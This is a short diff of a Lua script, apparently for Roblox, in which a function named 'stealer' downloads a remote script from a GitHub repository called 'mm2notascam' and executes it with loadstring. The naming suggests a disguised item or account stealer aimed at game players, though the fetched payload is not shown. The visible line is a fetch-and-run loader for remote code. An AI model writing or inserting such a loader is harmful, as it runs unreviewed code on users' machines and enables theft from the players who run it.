@@ -1,3 +1,4 @@
+
 local function stealer()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/FloppsCat/mm2notascam/refs/heads/main/notascam.lua'))()
 end
